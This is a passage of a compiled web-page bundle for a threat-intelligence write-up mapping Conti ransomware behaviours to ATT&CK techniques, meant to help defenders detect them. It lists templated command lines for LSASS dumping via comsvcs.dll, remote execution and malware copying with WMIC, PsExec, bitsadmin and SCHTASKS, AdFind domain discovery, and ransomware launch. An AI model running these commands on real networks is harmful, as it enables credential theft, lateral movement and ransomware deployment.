",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\lsass.DMP"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\lsass (2).DMP"))))),(0,l.kt)("h3",{id:"conti-used-wmic-via-cobalt-strike-to-launch-comsvcsdll-via-rundll32-on-remote-systems-for-credential-access"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"WMIC via Cobalt Strike")," to launch ",(0,l.kt)("em",{parentName:"h3"},"comsvcs.dll")," via ",(0,l.kt)("em",{parentName:"h3"},"RunDll32")," on remote systems for Credential Access."),(0,l.kt)("h4",{id:"tactic-12"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Credential Access")),(0,l.kt)("h4",{id:"techniques-12"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1047 - Windows Management Instrumentation"),(0,l.kt)("li",{parentName:"ul"},"T1003.001 - OS Credential Dumping: LSASS Memory")),(0,l.kt)("h4",{id:"behaviors-and-observables-12"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1047"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"WMIC")," command to launch ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," on remote system."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:#{target} process call create \\"cmd /c rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump PID'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1003.001"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"comsvcs.dll")," executed on remote system to create a LSASS process memory dump."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:#{target} process call create \\"cmd /c rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump #{pID}'))))),(0,l.kt)("h4",{id:"notes-7"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("em",{parentName:"li"},"WMIC.exe")," (Windows Management Instrumentation Commandline utility) allows for command execution at remote hosts.")),(0,l.kt)("h3",{id:"conti-used-psexec-via-cobalt-strike-to-launch-comsvcsdll-via-rundll32-on-remote-systems-for-credential-access"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"PSEXEC via Cobalt Strike")," to launch ",(0,l.kt)("em",{parentName:"h3"},"comsvcs.dll")," via ",(0,l.kt)("em",{parentName:"h3"},"RunDll32")," on remote systems for Credential Access."),(0,l.kt)("h4",{id:"tactic-13"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Credential Access")),(0,l.kt)("h4",{id:"techniques-13"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1569.002 - System Services: Service Execution"),(0,l.kt)("li",{parentName:"ul"},"T1003.001 - OS Credential Dumping: LSASS Memory")),(0,l.kt)("h4",{id:"behaviors-and-observables-13"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1569.002"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PSEXEC")," command to launch ",(0,l.kt)("em",{parentName:"td"},"RunDll32")," on remote system."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"psexec #{target} cmd /c rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump #{pID}"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1003.001"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"comsvcs.dll")," executed on remote system to create a LSASS process memory dump."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"psexec #{target} cmd /c rundll32.exe C:\\\\windows\\\\System32\\\\comsvcs.dll, MiniDump #{pID}"))))),(0,l.kt)("h3",{id:"conti-used-psexec-via-cobalt-strike-to-copy-malicious-files-into-remote-systems-for-lateral-movement"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"PSEXEC via Cobalt Strike")," to copy malicious files into remote systems for Lateral Movement."),(0,l.kt)("h4",{id:"tactic-14"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Lateral Movement")),(0,l.kt)("h4",{id:"techniques-14"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1570 - Lateral Tool Transfer")),(0,l.kt)("h4",{id:"behaviors-and-observables-14"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1570"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"PsExec.exe")," executes ",(0,l.kt)("em",{parentName:"td"},"doscmd/copy")," command on multiple target systems."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'PsExec.exe /accepteula @C:\\\\share$\\\\comps1.txt -u DOMAIN\\\\ADMINISTRATOR -p PASSWORD cmd /c COPY "\\\\\\\\Domain Controller\\\\share$\\\\fx166.exe" "C:\\\\windows\\\\temp\\\\"'))))),(0,l.kt)("h4",{id:"notes-8"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("em",{parentName:"li"},"@C:","\\","share$","\\","comps1.txt")," represents the list of target systems. The ",(0,l.kt)("em",{parentName:"li"},"copy")," command is executed on each system listed on comps1.txt."),(0,l.kt)("li",{parentName:"ul"},"In this case, the malicious file is hosted at a shared folder at the Domain Controller")),(0,l.kt)("h3",{id:"conti-used-wmic-via-cobalt-strike-to-copy-and-start-execution-of-malicious-files-into-remote-systems-for-lateral-movement"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"WMIC via Cobalt Strike")," to copy and start execution of malicious files into remote systems for Lateral Movement."),(0,l.kt)("h4",{id:"tactic-15"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Lateral Movement")),(0,l.kt)("h4",{id:"techniques-15"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1570 - Lateral Tool Transfer")),(0,l.kt)("h4",{id:"behaviors-and-observables-15"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1570"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"WMIC")," executes ",(0,l.kt)("em",{parentName:"td"},"bitsadmin /transfer")," command on multiple target systems."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'wmic /node:@C:\\\\share$\\\\comps1.txt /user:\\"DOMAIN\\\\Administrator\\" /password:\\"PASSWORD\\" process call create \\"cmd.exe /c bitsadmin /transfer fx166 \\\\\\\\Domain Controller\\\\share$\\\\fx166.exe %APPDATA%\\\\fx166.exe&%APPDATA%\\\\fx166.exe\\"'))))),(0,l.kt)("h4",{id:"notes-9"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("em",{parentName:"li"},"@C:","\\","share$","\\","comps1.txt")," represents the list of target systems. The ",(0,l.kt)("em",{parentName:"li"},"BITSAdmin")," command is executed on each system listed on comps1.txt."),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("em",{parentName:"li"},"BITSAdmin")," is a command-line tool that you can use to create download or upload jobs (source: ",(0,l.kt)("a",{parentName:"li",href:"https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool"},"https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool"),")")),(0,l.kt)("h3",{id:"conti-used-schtasks-via-cobalt-strike-to-execute-malicious-files-into-remote-systems-for-lateral-movement"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"SCHTASKS via Cobalt Strike")," to execute malicious files into remote systems for Lateral Movement."),(0,l.kt)("h4",{id:"tactic-16"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Lateral Movement")),(0,l.kt)("h4",{id:"techniques-16"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1570 - Lateral Tool Transfer"),(0,l.kt)("li",{parentName:"ul"},"T1053.005 - Scheduled Task/Job: Scheduled Task")),(0,l.kt)("h4",{id:"behaviors-and-observables-16"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1570"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"SCHTASKS")," to create tasks on remote system."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'SCHTASKS /s remote-hostname123 /RU \\"SYSTEM\\" /create /tn \\"WindowsSensor15\\" /tr \\"cmd.exe /c C:\\\\ProgramData\\\\srvvhost.exe\\" /sc ONCE /sd 01/01/2021 /st 00: 00'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'SCHTASKS /s #{IP/HOSTNAME} /RU \\"SYSTEM\\" /create /tn \\"WindowsSensor15\\" /tr \\"cmd.exe /c C:\\\\ProgramData\\\\P32.exe\\" /sc ONCE /sd 01/01/1970 /st 00: 00'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'SCHTASKS /s #{IP/HOSTNAME} /run /TN  \\"WindowsSensor15\\'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'SCHTASKS /s #{IP/HOSTNAME} /TN \\"WindowsSensor15\\" /DELETE /F'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1053.005"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"SCHTASKS")," to run tasks on remote system."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"SCHTASKS /s"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1053.005"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"SCHTASKS")," to delete tasks on remote system."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'SCHTASKS /s #{IP/HOSTNAME} /TN "WindowsSensor15" /DELETE /F'))))),(0,l.kt)("h3",{id:"conti-used-adfind-via-cobalt-strike-for-discovery"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"AdFind via Cobalt Strike")," for Discovery."),(0,l.kt)("h4",{id:"tactic-17"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Discovery")),(0,l.kt)("h4",{id:"techniques-17"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1016 - System Network Configuration Discovery")),(0,l.kt)("h4",{id:"behaviors-and-observables-17"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1016"),(0,l.kt)("td",{parentName:"tr",align:null},"Sequence of ",(0,l.kt)("em",{parentName:"td"},"AdFind.exe")," commands."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -f \\"(objectcategory=person)\\" > ad_users.txt'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -f \\"objectcategory=computer\\" > ad_computers.txt'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -f \\"(objectcategory=organizationalUnit)\\" > ad_ous.txt'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -sc trustdmp > trustdump.txt"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -f (objectCategory=subnet) > subnets.txt"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -f \\"(objectcategory=group)\\" > ad_group.txt'),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -gcb -sc trustdmp > trustdump.txt"))))),(0,l.kt)("h4",{id:"notes-10"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("em",{parentName:"li"},"AdFind")," commands executed in sequense as in the well known ",(0,l.kt)("em",{parentName:"li"},"adf.bat")," script.")),(0,l.kt)("h3",{id:"conti-used-cobalt-strike-to-launch-whole-domain-encryption-for-impact"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"Cobalt Strike")," to launch whole domain encryption for Impact."),(0,l.kt)("h4",{id:"tactic-18"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Impact")),(0,l.kt)("h4",{id:"techniques-18"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer"),(0,l.kt)("li",{parentName:"ul"},"T1486 - Data Encrypted for Impact"),(0,l.kt)("li",{parentName:"ul"},"T1055 - Process Injection")),(0,l.kt)("h4",{id:"behaviors-and-observables-18"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"Ransomware binary downloaded."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\locker.bat"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1486",(0,l.kt)("br",null),"T1055"),(0,l.kt)("td",{parentName:"tr",align:null},"Injected Explorer launched ransowmware via ",(0,l.kt)("em",{parentName:"td"},"CMD"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\" /C  \\"C:\\\\locker.bat\\"'))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},"Ransom notes written to all afected folders."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\Default\\\\AppData\\\\readme.txt"))))),(0,l.kt)("h3",{id:"conti-used-rdp-to-launch-whole-domain-encryption-for-impact"},"Conti used ",(0,l.kt)("em",{parentName:"h3"},"RDP")," to launch whole domain encryption for Impact."),(0,l.kt)("h4",{id:"tactic-19"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Impact")),(0,l.kt)("h4",{id:"techniques-19"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer"),(0,l.kt)("li",{parentName:"ul"},"T1486 - Data Encrypted for Impact")),(0,l.kt)("h4",{id:"behaviors-and-observables-19"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1105"),(0,l.kt)("td",{parentName:"tr",align:null},"Ransomware binary downloaded via ",(0,l.kt)("em",{parentName:"td"},"RDP"),"."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\backup.exe"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1486"),(0,l.kt)("td",{parentName:"tr",align:null},"Explorer launched ransowmare."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\backup.exe"'))))),(0,l.kt)("h4",{id:"notes-11"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("em",{parentName:"li"},"backup.exe")," connects to all host to run the malware.")))}k.isMDXComponent=!0}}]);